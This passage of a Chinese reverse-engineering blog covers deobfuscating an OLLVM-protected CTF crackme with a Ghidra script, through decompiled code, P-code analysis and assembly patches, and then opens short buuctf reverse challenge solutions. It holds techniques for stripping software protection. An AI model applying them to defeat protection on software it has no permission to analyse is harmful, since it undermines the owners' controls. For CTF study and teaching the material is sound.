<p>那么真正的问题在哪呢？经过调试输出发现，有的汇编指令基本块虽然是JZ，但转换为p-code基本块后，判断条件变成了INT_NOTEQUAL，同时真出口与假出口调换。只需在代码中添加一个判断即可。</p>
<h2 id="修复效果"><a class="markdownIt-Anchor" href="#修复效果"></a> 修复效果</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(undefined4 param_1,undefined8 param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">time_t</span> tVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_98 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_90 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_88 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_80 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125; local_78 [<span class="number">8</span>];</span><br><span class="line">  &#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125; local_70 [<span class="number">7</span>];</span><br><span class="line">  byte local_69;</span><br><span class="line">  <span class="type">int</span> local_68;</span><br><span class="line">  <span class="type">int</span> local_64;</span><br><span class="line">  <span class="type">int</span> local_60;</span><br><span class="line">  <span class="type">int</span> local_5c;</span><br><span class="line">  byte local_58 [<span class="number">24</span>];</span><br><span class="line">  undefined local_40 [<span class="number">8</span>];</span><br><span class="line">  $_3 local_38 [<span class="number">8</span>];</span><br><span class="line">  undefined local_30 [<span class="number">8</span>];</span><br><span class="line">  $_2 local_28 [<span class="number">4</span>];</span><br><span class="line">  <span class="type">int</span> local_24;</span><br><span class="line">  undefined8 local_20;</span><br><span class="line">  undefined4 local_18;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  undefined local_a;</span><br><span class="line">  undefined local_9;</span><br><span class="line">  </span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  local_20 = param_2;</span><br><span class="line">  local_18 = param_1;</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  local_24 = (<span class="type">int</span>)tVar2;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;func(?)=\&quot;01abfc750a0c942167651c40d088531d\&quot;?&quot;</span>);</span><br><span class="line">  iVar1 = getchar();</span><br><span class="line">  local_58[<span class="number">0</span>] = (byte)iVar1;</span><br><span class="line">  fgets((<span class="type">char</span> *)(local_58 + <span class="number">1</span>),<span class="number">0x15</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  tVar2 = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">  local_5c = (<span class="type">int</span>)tVar2;</span><br><span class="line">  local_60 = local_5c - local_24;</span><br><span class="line">  local_10 = local_60;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> &lt; local_60) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let the silent second hand take the place of my doubt...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_00400c30;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    sVar3 = <span class="built_in">strlen</span>((<span class="type">char</span> *)local_58);</span><br><span class="line">    local_64 = (<span class="type">int</span>)sVar3;</span><br><span class="line">LAB_00400c30:</span><br><span class="line">    sVar3 = <span class="built_in">strlen</span>((<span class="type">char</span> *)local_58);</span><br><span class="line">    local_64 = (<span class="type">int</span>)sVar3;</span><br><span class="line">    local_a = local_64 != <span class="number">0x15</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">  <span class="keyword">if</span> (local_64 != <span class="number">0x15</span>) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    local_68 = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">  local_64 = <span class="number">0x15</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x14</span> &lt; local_68) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_004010ea;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win&quot;</span>);</span><br><span class="line">LAB_004010ea:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) == <span class="number">0</span> || y &lt; <span class="number">10</span>) <span class="keyword">goto</span> LAB_00400dd3;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      local_69 = local_58[local_68] ^ (byte)local_60;</span><br><span class="line">      local_70[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,local_69);</span><br><span class="line">      local_78[<span class="number">0</span>] = (&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_1::operator()(local_40,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;::operator()(local_78,<span class="number">7</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_70,(<span class="type">char</span>)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_80[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_2::operator()(local_28,local_69);</span><br><span class="line">      local_88[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_2::operator()(local_28,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_88,<span class="number">0x12</span>);</span><br><span class="line">      local_90[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_3::operator()(local_38,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_90,<span class="string">&#x27;\x03&#x27;</span>);</span><br><span class="line">      local_98[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_98,<span class="string">&#x27;\x02&#x27;</span>);</span><br><span class="line">      <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_80,(byte)iVar1);</span><br><span class="line">LAB_00400dd3:</span><br><span class="line">      local_69 = local_58[local_68] ^ (byte)local_60;</span><br><span class="line">      local_70[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,local_69);</span><br><span class="line">      local_78[<span class="number">0</span>] = (&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_1::operator()(local_40,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">int</span>)#<span class="number">1</span>&#125;::operator()(local_78,<span class="number">7</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_70,(<span class="type">char</span>)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_80[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_2::operator()(local_28,local_69);</span><br><span class="line">      local_88[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)</span><br><span class="line">                    main::$_2::operator()(local_28,local_58[local_68 + <span class="number">-1</span> + local_60]);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_88,<span class="number">0x12</span>);</span><br><span class="line">      local_90[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_3::operator()(local_38,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_90,<span class="string">&#x27;\x03&#x27;</span>);</span><br><span class="line">      local_98[<span class="number">0</span>] = (&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;)main::$_0::operator()(local_30,(<span class="type">char</span>)iVar1);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_98,<span class="string">&#x27;\x02&#x27;</span>);</span><br><span class="line">      iVar1 = <span class="type">const</span>::&#123;lambda(<span class="type">char</span>)#<span class="number">1</span>&#125;::operator()(local_80,(byte)iVar1);</span><br><span class="line">      local_69 = (byte)iVar1;</span><br><span class="line">      local_9 = enc[local_68 + <span class="number">-1</span>] != local_69;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">    <span class="keyword">if</span> (enc[local_68 + <span class="number">-1</span>] != local_69) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y);</span><br><span class="line">    local_68 = local_68 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ((x * (x + <span class="number">-1</span>) &amp; <span class="number">1U</span>) != <span class="number">0</span> &amp;&amp; <span class="number">9</span> &lt; y) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，整个控制流已经完全正确地展现在我们面前。虽然还有一些全局变量的混淆，但至少已经能读懂了。需要注意的是，还有一个lambda函数无法被正常解混淆，因为其状态变量不是直接比较，而是进行了加运算再与0比较。这实际上和直接比较没什么区别，但会导致我们的脚本无法识别。因此还需要进行一些优化。</p>
<p>下面，还是首先处理一下与只读未写全局变量相关的混淆。这类混淆实际上混淆效果远不如控制流平坦化，但是出现在反汇编代码中还是让人难受。为了满足我这要了命的强迫症，遂决定静下心研究一番。</p>
<p>对于程序中所有全局变量的获取并没有什么难度。首先可以通过获取所有Symbol得到程序中的所有符号，这些符号包括标号（Label）和函数（Function），将函数剔除，然后获取该Label下的Data数据。在Ghidra的初始分析中，包含对变量引用的分析。Ghidra提供了获取全局变量引用的API，更方便的是，这些引用信息中还包含对变量的具体引用方式，包括读、写、调用等。因此，可以非常方便地获取所有没有写只有读的全局变量。这些全局变量在被读取时的值一定都是0。</p>
<h2 id="全局变量混淆去除"><a class="markdownIt-Anchor" href="#全局变量混淆去除"></a> 全局变量混淆去除</h2>
<p>从上面的反汇编代码可以看出，全局变量混淆主要是通过永真表达式<code>(x * (x + -1) &amp; 1U) == 0 || y &lt; 10</code>和永假表达式<code>(x * (x + -1) &amp; 1U) != 0 &amp;&amp; 9 &lt; y</code>实现的。混淆后，同一段代码逻辑被复制为两份，但实际上只会执行一份。</p>
<p>因此，要想实现自动化解除此类混淆，就需要能够正确识别此类表达式并计算出结果。</p>
<p>不难发现，这些表达式有一些统一的特征：表达式的结果仅由只读不写的全局变量决定。通过对控制流平坦化的去混淆过程可知，所有条件跳转均通过<code>CBRANCH</code>实现，在分析后得到的高级P-code（PcodeOpAST）序列中，可以通过<code>getDef</code>方法获取一个Varnode被定义的P-code指令。因此，我们可以利用这个API层层向上回溯，梳理出条件跳转的条件被计算的全过程，形成一个树状结构。梳理完成后，获取所有参与计算的非常数Varnode。若所有这些Varnode都是全局变量，则说明：<font color=red>我们找到了一个通过全局变量进行混淆的假分支</font>。随后，只需要按部就班地完成计算，即可确定条件跳转的条件的值，就可以安全移除这个假分支了。</p>
<p>不过，在具体脚本编写过程中，我还发现了一个问题。</p>
<p>在高级P-code序列中，有这样一类指令：<code>INDIRECT</code>。这是一种高级P-code指令，有2个输入参数和1个输出参数。它是为了满足P-code静态单赋值特性而设计的。那么这条指令到底有什么作用呢？</p>
<p>在Ghidra的一个Issue中有人提到了不理解<code>INDIRECT</code>指令的问题，下面是我认为最好的一个回答：</p>
<blockquote>
<p>I think that INDIRECT just indicates the varnode in output can be affected by the pcode indicated by it’s input1.<br />
So it’s impossible for a varnode to be affected when it’s both not the output of an instruction and it’s not associated with the instruction through an INDIRECT.<br />
In other words, the varnodes being the output of all INDIRECTs associated with an instruction is the over-approximation of all varnodes that may be affected by the execution of this instruction. Only CALL/CALLIND instructions can have side affects because we need to take the execution of their corresponding subroutines into consideration. So INDIRECT instructions only appear before CALL/CALLIND instructions.<br />
I wonder if my understanding is proper.<br />
Thank you.</p>
</blockquote>
<p>对于全局变量而言，一个线程的不同函数均有可能修改其值。为保证两次为全局变量重新赋值之间的所有本函数P-code在访问全局变量时获取的值均相同，需要强制添加<code>INDIRECT</code>指令作为一条针对全局变量的“可能的”重新赋值指令。这条指令需要添加在函数调用指令<code>CALL</code>、<code>CALLIND</code>之前，表示这条<code>CALL</code>或<code>CALLIND</code>有可能会影响到<code>INDIRECT</code>输出Varnode的值。<code>INDIRECT</code>指令的第2个参数一定是一个常数Varnode，将其解析为int后可<strong>使用该<code>INDIRECT</code>指令的地址和这个int值</strong>创建一个SequenceNumber序列号对象。每一个序列号都对应着一个<code>CALL</code>或<code>CALLIND</code>指令，表示这条函数调用指令可能会影响输出Varnode的值。</p>
<p><code>INDIRECT</code>将函数调用指令与Varnode建立了联系，<font color=red><strong>它使得在任意P-code序列中，对于任意的Varnode，除非它作为一条P-code的输出Varnode，或它通过<code>INDIRECT</code>指令与某条函数调用指令建立联系（此时这个Varnode实际上还是作为输出Varnode存在），否则任何P-code指令将无法修改该Varnode的值。</strong></font>前面这句话可能需要一段时间理解，但却是我认为最能够总结<code>INDIRECT</code>指令功能的一句话。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OllvmSolver.java&gt; (ram, 0x6020c4, 4) INDIRECT (ram, 0x6020c4, 4) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff68, 1) INDIRECT (stack, 0xffffffffffffff68, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff70, 1) INDIRECT (stack, 0xffffffffffffff70, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff78, 1) INDIRECT (stack, 0xffffffffffffff78, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff80, 1) INDIRECT (stack, 0xffffffffffffff80, 1) , (const, 0x454, 4)</span><br><span class="line">OllvmSolver.java&gt; INDIRECT: (unique, 0x100006f3, 1) CALL (ram, 0x4016c0, 8) , (unique, 0x3100, 8) , (register, 0x0, 1)</span><br><span class="line">OllvmSolver.java&gt; (stack, 0xffffffffffffff88, 1) INDIRECT (stack, 0xffffffffffffff88, 1) , (const, 0x454, 4)</span><br></pre></td></tr></table></figure>
<p>举个例子，上面的输出所有行成对来看，第一行为<code>INDIRECT</code> P-code指令，第二行为序列号为0x454的指令。上面的例子可以说明，0x4016C0这个函数的调用可能会导致<code>(ram, 0x6020c4, 4)</code>、<code>(stack, 0xffffffffffffff68, 1)</code>等Varnode的值发生改变。有读者可能会问，为什么一个函数调用会修改局部变量的值？这实际上是一种过拟合，<code>INDIRECT</code>只是进行了指示，并不是说这个值在函数调用后一定会发生改变。</p>
<p>生成上述输出的Script代码片段在下面给出。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Address addr: hFunction.getFunction().getBody().getAddresses(<span class="literal">true</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Iterator&lt;PcodeOpAST&gt; iter = hFunction.getPcodeOps(addr);</span><br><span class="line">    <span class="keyword">if</span> (iter.hasNext()) &#123;</span><br><span class="line">        printf(<span class="string">&quot;Address: %#x\n&quot;</span>, addr.getOffset());</span><br><span class="line">        <span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line">            <span class="type">PcodeOpAST</span> <span class="variable">op</span> <span class="operator">=</span> iter.next();</span><br><span class="line">            <span class="keyword">if</span> (op.getOpcode() == PcodeOp.INDIRECT) &#123;</span><br><span class="line">                <span class="type">SequenceNumber</span> <span class="variable">sn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SequenceNumber</span>(addr, (<span class="type">int</span>) op.getInput(<span class="number">1</span>).getOffset());</span><br><span class="line">                println(<span class="string">&quot;INDIRECT: &quot;</span> + hFunction.getPcodeOp(sn).toString());</span><br><span class="line">            &#125;</span><br><span class="line">            println(op.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>OK，现在我们已经知道，<code>INDIRECT</code>指令只不过是指示函数调用对Varnode可能产生的影响。但前面我们已经分析得到了所有的只读不写全局变量。如果<code>INDIRECT</code>指令的输出是这些全局变量中的一个，我们实际上完全可以将其忽略不计。因此在梳理计算过程的树数据结构时，当到达<code>INDIRECT</code>时，就可以停止递归了。</p>
<p>在树数据结构梳理完成，计算完成后，就可以考虑如何对程序本身的汇编代码进行修改了。</p>
<p>在本题中，所有相关的假分支都是通过<code>cmovxx</code>实现的，但是此类指令已经全部被控制流平坦化修改为<code>jnz</code>和<code>jmp</code>指令了。</p>
<p>如下面的示例，控制流平坦化解混淆前：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0040101e 41  0f  9c  c1    SETL       R9B</span><br><span class="line">00401022 45  08  c8       OR         R8B ,R9B</span><br><span class="line">00401025 41  f6  c0  01    TEST       R8B ,0x1</span><br><span class="line">00401029 0f  45  c1       CMOVNZ     iVar1 ,ECX</span><br><span class="line">0040102c 89  85  6c       MOV        dword ptr [RBP  + local_9c ],iVar1 ; update state var, OK to be deleted</span><br><span class="line">         ff  ff  ff</span><br><span class="line">00401032 e9  ac  02       JMP        LAB_004012e3</span><br><span class="line">         00  00</span><br></pre></td></tr></table></figure>
<p>解混淆后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0040101e 41  0f  9c  c1    SETL       R9B</span><br><span class="line">00401022 45  08  c8       OR         R8B ,R9B</span><br><span class="line">00401025 41  f6  c0  01    TEST       R8B ,0x1</span><br><span class="line">00401029 75  0c           JNZ        LAB_00401037</span><br><span class="line">0040102b 66  e9  86  02    JMP        LAB_004012b5</span><br><span class="line">0040102f ff              ??         FFh</span><br><span class="line">00401030 ff              ??         FFh</span><br><span class="line">00401031 ff              ??         FFh</span><br><span class="line">00401032 e9  ac  02       JMP        LAB_004012e3</span><br><span class="line">         00  00</span><br></pre></td></tr></table></figure>
<p>由于<code>jnz</code>条件已知，因此只需要将其修改为<code>nop</code>（条件不满足）或<code>jmp</code>（条件满足）即可。</p>
<p>最终的脚本：<a href="OllvmSolver.java">脚本</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/04/03/buuctf-reverse-write-ups-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/03/buuctf-reverse-write-ups-1/" class="post-title-link" itemprop="url">buuctf-reverse write-ups (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-04-03 00:33:33 / 修改时间：00:36:36" itemprop="dateCreated datePublished" datetime="2024-04-03T00:33:33+08:00">2024-04-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>20k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>19 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu001-easyre"><a class="markdownIt-Anchor" href="#buu001-easyre"></a> buu001-easyre</h1>
<p>直接用IDA打开，main函数里面就是。</p>
<h1 id="buu002-reverse1"><a class="markdownIt-Anchor" href="#buu002-reverse1"></a> buu002-reverse1</h1>
<p>用IDA打开通过输出字符串定位到输入部分，flag在字符串中直接就有。</p>
<h1 id="buu003-reverse2"><a class="markdownIt-Anchor" href="#buu003-reverse2"></a> buu003-reverse2</h1>
<p>用IDA打开，这是一个Linux ELF文件，在main函数中首先把flag里面的i和r替换成1就行了。</p>
<h1 id="buu004-内涵的软件"><a class="markdownIt-Anchor" href="#buu004-内涵的软件"></a> buu004-内涵的软件</h1>
<p>用IDA打开，把DBAPP改成flag就行了。</p>
<h1 id="buu005-新年快乐"><a class="markdownIt-Anchor" href="#buu005-新年快乐"></a> buu005-新年快乐</h1>
<p>这道题是使用了UPX进行了压缩加壳，只需要用UPX工具解压即可得到flag。</p>
<p>UPX使用方法：</p>
